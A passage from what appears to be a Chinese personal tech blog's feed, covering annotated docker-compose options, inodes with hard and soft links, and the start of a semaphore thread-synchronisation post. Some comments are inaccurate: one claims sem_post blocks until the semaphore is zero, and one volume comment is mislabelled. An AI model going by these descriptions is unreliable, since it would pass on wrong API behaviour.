class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">Compose和Docker兼容性：<br>    Compose 文件格式有3个版本,分别为1, 2.x 和 3.x<br>    目前主流的为 3.x 其支持 docker 1.13.0 及其以上的版本<br><br>常用参数：<br>    version           <span class="hljs-comment"># 指定 compose 文件的版本</span><br>    services          <span class="hljs-comment"># 定义所有的 service 信息, services 下面的第一级别的 key 既是一个 service 的名称</span><br><br>        build                 <span class="hljs-comment"># 指定包含构建上下文的路径, 或作为一个对象，该对象具有 context 和指定的 dockerfile 文件以及 args 参数值</span><br>            context               <span class="hljs-comment"># context: 指定 Dockerfile 文件所在的路径</span><br>            dockerfile            <span class="hljs-comment"># dockerfile: 指定 context 指定的目录下面的 Dockerfile 的名称(默认为 Dockerfile)</span><br>            args                  <span class="hljs-comment"># args: Dockerfile 在 build 过程中需要的参数 (等同于 docker container build --build-arg 的作用)</span><br>            cache_from            <span class="hljs-comment"># v3.2中新增的参数, 指定缓存的镜像列表 (等同于 docker container build --cache_from 的作用)</span><br>            labels                <span class="hljs-comment"># v3.3中新增的参数, 设置镜像的元数据 (等同于 docker container build --labels 的作用)</span><br>            shm_size              <span class="hljs-comment"># v3.5中新增的参数, 设置容器 /dev/shm 分区的大小 (等同于 docker container build --shm-size 的作用)</span><br><br>        <span class="hljs-built_in">command</span>               <span class="hljs-comment"># 覆盖容器启动后默认执行的命令, 支持 shell 格式和 [] 格式</span><br><br>        configs               <span class="hljs-comment"># 不知道怎么用</span><br><br>        cgroup_parent         <span class="hljs-comment"># 不知道怎么用</span><br><br>        container_name        <span class="hljs-comment"># 指定容器的名称 (等同于 docker run --name 的作用)</span><br><br>        credential_spec       <span class="hljs-comment"># 不知道怎么用</span><br><br>        deploy                <span class="hljs-comment"># v3 版本以上, 指定与部署和运行服务相关的配置, deploy 部分是 docker stack 使用的, docker stack 依赖 docker swarm</span><br>            endpoint_mode         <span class="hljs-comment"># v3.3 版本中新增的功能, 指定服务暴露的方式</span><br>                vip                   <span class="hljs-comment"># Docker 为该服务分配了一个虚拟 IP(VIP), 作为客户端的访问服务的地址</span><br>                dnsrr                 <span class="hljs-comment"># DNS轮询, Docker 为该服务设置 DNS 条目, 使得服务名称的 DNS 查询返回一个 IP 地址列表, 客户端直接访问其中的一个地址</span><br>            labels                <span class="hljs-comment"># 指定服务的标签，这些标签仅在服务上设置</span><br>            mode                  <span class="hljs-comment"># 指定 deploy 的模式</span><br>                global                <span class="hljs-comment"># 每个集群节点都只有一个容器</span><br>                replicated            <span class="hljs-comment"># 用户可以指定集群中容器的数量(默认)</span><br>            placement             <span class="hljs-comment"># 不知道怎么用</span><br>            replicas              <span class="hljs-comment"># deploy 的 mode 为 replicated 时, 指定容器副本的数量</span><br>            resources             <span class="hljs-comment"># 资源限制</span><br>                limits                <span class="hljs-comment"># 设置容器的资源限制</span><br>                    cpus: <span class="hljs-string">&quot;0.5&quot;</span>           <span class="hljs-comment"># 设置该容器最多只能使用 50% 的 CPU </span><br>                    memory: 50M           <span class="hljs-comment"># 设置该容器最多只能使用 50M 的内存空间 </span><br>                reservations          <span class="hljs-comment"># 设置为容器预留的系统资源(随时可用)</span><br>                    cpus: <span class="hljs-string">&quot;0.2&quot;</span>           <span class="hljs-comment"># 为该容器保留 20% 的 CPU</span><br>                    memory: 20M           <span class="hljs-comment"># 为该容器保留 20M 的内存空间</span><br>            restart_policy        <span class="hljs-comment"># 定义容器重启策略, 用于代替 restart 参数</span><br>                condition             <span class="hljs-comment"># 定义容器重启策略(接受三个参数)</span><br>                    none                  <span class="hljs-comment"># 不尝试重启</span><br>                    on-failure            <span class="hljs-comment"># 只有当容器内部应用程序出现问题才会重启</span><br>                    any                   <span class="hljs-comment"># 无论如何都会尝试重启(默认)</span><br>                delay                 <span class="hljs-comment"># 尝试重启的间隔时间(默认为 0s)</span><br>                max_attempts          <span class="hljs-comment"># 尝试重启次数(默认一直尝试重启)</span><br>                window                <span class="hljs-comment"># 检查重启是否成功之前的等待时间(即如果容器启动了, 隔多少秒之后去检测容器是否正常, 默认 0s)</span><br>            update_config         <span class="hljs-comment"># 用于配置滚动更新配置</span><br>                parallelism           <span class="hljs-comment"># 一次性更新的容器数量</span><br>                delay                 <span class="hljs-comment"># 更新一组容器之间的间隔时间</span><br>                failure_action        <span class="hljs-comment"># 定义更新失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续更新</span><br>                    rollback              <span class="hljs-comment"># 回滚更新</span><br>                    pause                 <span class="hljs-comment"># 暂停更新(默认)</span><br>                monitor               <span class="hljs-comment"># 每次更新后的持续时间以监视更新是否失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值为0)</span><br>                order                 <span class="hljs-comment"># v3.4 版本中新增的参数, 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment">#旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment">#首先启动新任务, 并且正在运行的任务暂时重叠</span><br>            rollback_config       <span class="hljs-comment"># v3.7 版本中新增的参数, 用于定义在 update_config 更新失败的回滚策略</span><br>                parallelism           <span class="hljs-comment"># 一次回滚的容器数, 如果设置为0, 则所有容器同时回滚</span><br>                delay                 <span class="hljs-comment"># 每个组回滚之间的时间间隔(默认为0)</span><br>                failure_action        <span class="hljs-comment"># 定义回滚失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续回滚</span><br>                    pause                 <span class="hljs-comment"># 暂停回滚</span><br>                monitor               <span class="hljs-comment"># 每次回滚任务后的持续时间以监视失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值0)</span><br>                order                 <span class="hljs-comment"># 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment"># 旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment"># 首先启动新任务, 并且正在运行的任务暂时重叠</span><br><br>            注意：<br>                支持 docker-compose up 和 docker-compose run 但不支持 docker stack deploy 的子选项<br>                security_opt  container_name  devices  tmpfs  stop_signal  links    cgroup_parent<br>                network_mode  external_links  restart  build  userns_mode  sysctls<br><br>        devices               <span class="hljs-comment"># 指定设备映射列表 (等同于 docker run --device 的作用)</span><br><br>        depends_on            <span class="hljs-comment"># 定义容器启动顺序 (此选项解决了容器之间的依赖关系， 此选项在 v3 版本中 使用 swarm 部署时将忽略该选项)</span><br>            示例：<br>                docker-compose up 以依赖顺序启动服务，下面例子中 redis 和 db 服务在 web 启动前启动<br>                默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系<br>                version: <span class="hljs-string">&#x27;3&#x27;</span><br>                services:<br>                    web:<br>                        build: .<br>                        depends_on:<br>                            - db      <br>                            - redis  <br>                    redis:<br>                        image: redis<br>                    db:<br>                        image: postgres                             <br><br>        dns                   <span class="hljs-comment"># 设置 DNS 地址(等同于 docker run --dns 的作用)</span><br><br>        dns_search            <span class="hljs-comment"># 设置 DNS 搜索域(等同于 docker run --dns-search 的作用)</span><br><br>        tmpfs                 <span class="hljs-comment"># v2 版本以上, 挂载目录到容器中, 作为容器的临时文件系统(等同于 docker run --tmpfs 的作用, 在使用 swarm 部署时将忽略该选项)</span><br><br>        entrypoint            <span class="hljs-comment"># 覆盖容器的默认 entrypoint 指令 (等同于 docker run --entrypoint 的作用)</span><br><br>        env_file              <span class="hljs-comment"># 从指定文件中读取变量设置为容器中的环境变量, 可以是单个值或者一个文件列表, 如果多个文件中的变量重名则后面的变量覆盖前面的变量, environment 的值覆盖 env_file 的值</span><br>            文件格式：<br>                RACK_ENV=development <br><br>        environment           <span class="hljs-comment"># 设置环境变量， environment 的值可以覆盖 env_file 的值 (等同于 docker run --env 的作用)</span><br><br>        expose                <span class="hljs-comment"># 暴露端口, 但是不能和宿主机建立映射关系, 类似于 Dockerfile 的 EXPOSE 指令</span><br><br>        external_links        <span class="hljs-comment"># 连接不在 docker-compose.yml 中定义的容器或者不在 compose 管理的容器(docker run 启动的容器, 在 v3 版本中使用 swarm 部署时将忽略该选项)</span><br><br>        extra_hosts           <span class="hljs-comment"># 添加 host 记录到容器中的 /etc/hosts 中 (等同于 docker run --add-host 的作用)</span><br><br>        healthcheck           <span class="hljs-comment"># v2.1 以上版本, 定义容器健康状态检查, 类似于 Dockerfile 的 HEALTHCHECK 指令</span><br>            <span class="hljs-built_in">test</span>                  <span class="hljs-comment"># 检查容器检查状态的命令, 该选项必须是一个字符串或者列表, 第一项必须是 NONE, CMD 或 CMD-SHELL, 如果其是一个字符串则相当于 CMD-SHELL 加该字符串</span><br>                NONE                  <span class="hljs-comment"># 禁用容器的健康状态检测</span><br>                CMD                   <span class="hljs-comment"># test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;]</span><br>                CMD-SHELL             <span class="hljs-comment"># test: [&quot;CMD-SHELL&quot;, &quot;curl -f http://localhost || exit 1&quot;] 或者　test: curl -f https://localhost || exit 1</span><br>            interval: 1m30s       <span class="hljs-comment"># 每次检查之间的间隔时间</span><br>            <span class="hljs-built_in">timeout</span>: 10s          <span class="hljs-comment"># 运行命令的超时时间</span><br>            retries: 3            <span class="hljs-comment"># 重试次数</span><br>            start_period: 40s     <span class="hljs-comment"># v3.4 以上新增的选项, 定义容器启动时间间隔</span><br>            <span class="hljs-built_in">disable</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment"># true 或 false, 表示是否禁用健康状态检测和　test: NONE 相同</span><br><br>        image                 <span class="hljs-comment"># 指定 docker 镜像, 可以是远程仓库镜像、本地镜像</span><br><br>        init                  <span class="hljs-comment"># v3.7 中新增的参数, true 或 false 表示是否在容器中运行一个 init, 它接收信号并传递给进程</span><br><br>        isolation             <span class="hljs-comment"># 隔离容器技术, 在 Linux 中仅支持 default 值</span><br><br>        labels                <span class="hljs-comment"># 使用 Docker 标签将元数据添加到容器, 与 Dockerfile 中的 LABELS 类似</span><br><br>        links                 <span class="hljs-comment"># 链接到其它服务中的容器, 该选项是 docker 历史遗留的选项, 目前已被用户自定义网络名称空间取代, 最终有可能被废弃 (在使用 swarm 部署时将忽略该选项)</span><br><br>        logging               <span class="hljs-comment"># 设置容器日志服务</span><br>            driver                <span class="hljs-comment"># 指定日志记录驱动程序, 默认 json-file (等同于 docker run --log-driver 的作用)</span><br>            options               <span class="hljs-comment"># 指定日志的相关参数 (等同于 docker run --log-opt 的作用)</span><br>                max-size              <span class="hljs-comment"># 设置单个日志文件的大小, 当到达这个值后会进行日志滚动操作</span><br>                max-file              <span class="hljs-comment"># 日志文件保留的数量</span><br><br>        network_mode          <span class="hljs-comment"># 指定网络模式 (等同于 docker run --net 的作用, 在使用 swarm 部署时将忽略该选项)         </span><br><br>        networks              <span class="hljs-comment"># 将容器加入指定网络 (等同于 docker network connect 的作用), networks 可以位于 compose 文件顶级键和 services 键的二级键</span><br>            aliases               <span class="hljs-comment"># 同一网络上的容器可以使用服务名称或别名连接到其中一个服务的容器</span><br>            ipv4_address      <span class="hljs-comment"># IP V4 格式</span><br>            ipv6_address      <span class="hljs-comment"># IP V6 格式</span><br><br>            示例:<br>                version: <span class="hljs-string">&#x27;3.7&#x27;</span><br>                services: <br>                    <span class="hljs-built_in">test</span>: <br>                        image: nginx:1.14-alpine<br>                        container_name: mynginx<br>                        <span class="hljs-built_in">command</span>: ifconfig<br>                        networks: <br>                            app_net:                                <span class="hljs-comment"># 调用下面 networks 定义的 app_net 网络</span><br>                            ipv4_address: 172.16.238.10<br>                networks:<br>                    app_net:<br>                        driver: bridge<br>                        ipam:<br>                            driver: default<br>                            config:<br>                                - subnet: 172.16.238.0/24<br><br>        pid: <span class="hljs-string">&#x27;host&#x27;</span>           <span class="hljs-comment"># 共享宿主机的 进程空间(PID)</span><br><br>        ports                 <span class="hljs-comment"># 建立宿主机和容器之间的端口映射关系, ports 支持两种语法格式</span><br>            SHORT 语法格式示例:<br>                - <span class="hljs-string">&quot;3000&quot;</span>                            <span class="hljs-comment"># 暴露容器的 3000 端口, 宿主机的端口由 docker 随机映射一个没有被占用的端口</span><br>                - <span class="hljs-string">&quot;3000-3005&quot;</span>                       <span class="hljs-comment"># 暴露容器的 3000 到 3005 端口, 宿主机的端口由 docker 随机映射没有被占用的端口</span><br>                - <span class="hljs-string">&quot;8000:8000&quot;</span>                       <span class="hljs-comment"># 容器的 8000 端口和宿主机的 8000 端口建立映射关系</span><br>                - <span class="hljs-string">&quot;9090-9091:8080-8081&quot;</span><br>                - <span class="hljs-string">&quot;127.0.0.1:8001:8001&quot;</span>             <span class="hljs-comment"># 指定映射宿主机的指定地址的</span><br>                - <span class="hljs-string">&quot;127.0.0.1:5000-5010:5000-5010&quot;</span>   <br>                - <span class="hljs-string">&quot;6060:6060/udp&quot;</span>                   <span class="hljs-comment"># 指定协议</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                ports:<br>                    - target: 80                    <span class="hljs-comment"># 容器端口</span><br>                      published: 8080               <span class="hljs-comment"># 宿主机端口</span><br>                      protocol: tcp                 <span class="hljs-comment"># 协议类型</span><br>                      mode: host                    <span class="hljs-comment"># host 在每个节点上发布主机端口,  ingress 对于群模式端口进行负载均衡</span><br><br>        secrets               <span class="hljs-comment"># 不知道怎么用</span><br><br>        security_opt          <span class="hljs-comment"># 为每个容器覆盖默认的标签 (在使用 swarm 部署时将忽略该选项)</span><br><br>        stop_grace_period     <span class="hljs-comment"># 指定在发送了 SIGTERM 信号之后, 容器等待多少秒之后退出(默认 10s)</span><br><br>        stop_signal           <span class="hljs-comment"># 指定停止容器发送的信号 (默认为 SIGTERM 相当于 kill PID; SIGKILL 相当于 kill -9 PID; 在使用 swarm 部署时将忽略该选项)</span><br><br>        sysctls               <span class="hljs-comment"># 设置容器中的内核参数 (在使用 swarm 部署时将忽略该选项)</span><br><br>        ulimits               <span class="hljs-comment"># 设置容器的 limit</span><br><br>        userns_mode           <span class="hljs-comment"># 如果Docker守护程序配置了用户名称空间, 则禁用此服务的用户名称空间 (在使用 swarm 部署时将忽略该选项)</span><br><br>        volumes               <span class="hljs-comment"># 定义容器和宿主机的卷映射关系, 其和 networks 一样可以位于 services 键的二级键和 compose 顶级键, 如果需要跨服务间使用则在顶级键定义, 在 services 中引用</span><br>            SHORT 语法格式示例:<br>                volumes:<br>                    - /var/lib/mysql                <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的一个随机目录中</span><br>                    - /opt/data:/var/lib/mysql      <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的 /opt/data</span><br>                    - ./cache:/tmp/cache            <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机 compose 文件所在的位置</span><br>                    - ~/configs:/etc/configs/:ro    <span class="hljs-comment"># 映射容器宿主机的目录到容器中去, 权限只读</span><br>                    - datavolume:/var/lib/mysql     <span class="hljs-comment"># datavolume 为 volumes 顶级键定义的目录, 在此处直接调用</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                version: <span class="hljs-string">&quot;3.2&quot;</span><br>                services:<br>                    web:<br>                        image: nginx:alpine<br>                        ports:<br>                            - <span class="hljs-string">&quot;80:80&quot;</span><br>                        volumes:<br>                            - <span class="hljs-built_in">type</span>: volume                  <span class="hljs-comment"># mount 的类型, 必须是 bind、volume 或 tmpfs</span><br>                                <span class="hljs-built_in">source</span>: mydata              <span class="hljs-comment"># 宿主机目录</span><br>                                target: /data               <span class="hljs-comment"># 容器目录</span><br>                                volume:                     <span class="hljs-comment"># 配置额外的选项, 其 key 必须和 type 的值相同</span><br>                                    nocopy: <span class="hljs-literal">true</span>                <span class="hljs-comment"># volume 额外的选项, 在创建卷时禁用从容器复制数据</span><br>                            - <span class="hljs-built_in">type</span>: <span class="hljs-built_in">bind</span>                    <span class="hljs-comment"># volume 模式只指定容器路径即可, 宿主机路径随机生成; bind 需要指定容器和数据机的映射路径</span><br>                                <span class="hljs-built_in">source</span>: ./static<br>                                target: /opt/app/static<br>                                read_only: <span class="hljs-literal">true</span>             <span class="hljs-comment"># 设置文件系统为只读文件系统</span><br>                volumes:<br>                    mydata:                                 <span class="hljs-comment"># 定义在 volume, 可在所有服务中调用</span><br><br>        restart               <span class="hljs-comment"># 定义容器重启策略(在使用 swarm 部署时将忽略该选项, 在 swarm 使用 restart_policy 代替 restart)</span><br>            no                    <span class="hljs-comment"># 禁止自动重启容器(默认)</span><br>            always                <span class="hljs-comment"># 无论如何容器都会重启</span><br>            on-failure            <span class="hljs-comment"># 当出现 on-failure 报错时, 容器重新启动</span><br><br>        其他选项：<br>            domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, <span class="hljs-built_in">tty</span>, user, working_dir<br>            上面这些选项都只接受单个值和 docker run 的对应参数类似<br><br>        对于值为时间的可接受的值：<br>            2.5s<br>            10s<br>            1m30s<br>            2h32m<br>            5h34m56s<br>            时间单位: us, ms, s, m， h<br>        对于值为大小的可接受的值：<br>            2b<br>            1024kb<br>            2048k<br>            300m<br>            1gb<br>            单位: b, k, m, g 或者 kb, mb, gb<br>    networks          <span class="hljs-comment"># 定义 networks 信息</span><br>        driver                <span class="hljs-comment"># 指定网络模式, 大多数情况下, 它 bridge 于单个主机和 overlay Swarm 上</span><br>            bridge                <span class="hljs-comment"># Docker 默认使用 bridge 连接单个主机上的网络</span><br>            overlay               <span class="hljs-comment"># overlay 驱动程序创建一个跨多个节点命名的网络</span><br>            host                  <span class="hljs-comment"># 共享主机网络名称空间(等同于 docker run --net=host)</span><br>            none                  <span class="hljs-comment"># 等同于 docker run --net=none</span><br>        driver_opts           <span class="hljs-comment"># v3.2以上版本, 传递给驱动程序的参数, 这些参数取决于驱动程序</span><br>        attachable            <span class="hljs-comment"># driver 为 overlay 时使用, 如果设置为 true 则除了服务之外，独立容器也可以附加到该网络; 如果独立容器连接到该网络，则它可以与其他 Docker 守护进程连接到的该网络的服务和独立容器进行通信</span><br>        ipam                  <span class="hljs-comment"># 自定义 IPAM 配置. 这是一个具有多个属性的对象, 每个属性都是可选的</span><br>            driver                <span class="hljs-comment"># IPAM 驱动程序, bridge 或者 default</span><br>            config                <span class="hljs-comment"># 配置项</span><br>                subnet                <span class="hljs-comment"># CIDR格式的子网，表示该网络的网段</span><br>        external              <span class="hljs-comment"># 外部网络, 如果设置为 true 则 docker-compose up 不会尝试创建它, 如果它不存在则引发错误</span><br>        name                  <span class="hljs-comment"># v3.5 以上版本, 为此网络设置名称</span><br>文件格式示例：<br>    version: <span class="hljs-string">&quot;3&quot;</span><br>    services:<br>      redis:<br>        image: redis:alpine<br>        ports:<br>          - <span class="hljs-string">&quot;6379&quot;</span><br>        networks:<br>          - frontend<br>        deploy:<br>          replicas: 2<br>          update_config:<br>            parallelism: 2<br>            delay: 10s<br>          restart_policy:<br>            condition: on-failure<br>      db:<br>        image: postgres:9.4<br>        volumes:<br>          - db-data:/var/lib/postgresql/data<br>        networks:<br>          - backend<br>        deploy:<br>          placement:<br>            constraints: [node.role == manager]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>硬链接和软链接</title>
    <link href="/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/"/>
    <url>/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="硬链接和软链接"><a href="#硬链接和软链接" class="headerlink" title="硬链接和软链接"></a>硬链接和软链接</h1><h3 id="1-inode的概念"><a href="#1-inode的概念" class="headerlink" title="1.inode的概念"></a>1.inode的概念</h3><p>文件存储在磁盘上,磁盘在格式化文件系统后,分为两个部分,一个是inode存储区,一个是数据存储区,每个inode存储了这个文件详细信息,这些信息一般有:</p><ul><li><p>1.文件的所属者</p></li><li><p>2.文件的所属组</p></li><li><p>3.文件的权限</p></li><li><p>4.文件的创建时间</p></li><li><p>5.文件最近修改的时间</p></li><li><p>6.文件的最近访问时间</p></li><li><p>7.链接数,(有多少个链接指向这个文件)</p></li><li><p>8.文件的大小</p></li></ul><p>用户可以使用stat命令查看这些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> filename<br></code></pre></td></tr></table></figure><p>在linux平台上,</p><p>linux并不使用文件名识别文件,而使用inode识别文件,因此linux下每个文件名都指向了一个inode,在用户访问文件时,linux内部首先会获取要访问文件的inode号码,从inode里面获取真正的数据存储区。获取文件数据,在删除文件的时候,文件的links减1,当links减到0时,inode会被删除  </p><p>用户可以使用stat命令查看这些信息</p><h3 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h3><p>硬链接和源文件拥有相同的inode,<br>linux使用ln 源文件名 目标文件名创建硬链接,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> /path/to/sourcefile /path/to/destnaionfile<br></code></pre></td></tr></table></figure><h3 id="3-软链接"><a href="#3-软链接" class="headerlink" title="3.软链接"></a>3.软链接</h3><p>​软连接是一个存在的文件,但是文件里面存储的内容是目标文件的路径</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线程同步</title>
    <link href="/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"/>
    <url>/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h3 id="1-使用信号量实现线程同步"><a href="#1-使用信号量实现线程同步" class="headerlink" title="1.使用信号量实现线程同步"></a>1.使用信号量实现线程同步</h3><h3 id="使用的api"><a href="#使用的api" class="headerlink" title="使用的api"></a>使用的api</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sem_init</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem,<span class="hljs-type">int</span> shared,<span class="hljs-type">int</span> value)</span>;<span class="hljs-comment">//初始化无名信号灯</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//p操作,如果信号量大于0,则信号量-1,函数立即返回,否则函数进入阻塞状态直到信号量大于0</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_post</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//v操作,如果信号量等于0,则信号量+1,函数立即返回,否则函数进入阻塞状态,直到信号量等于0</span><br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 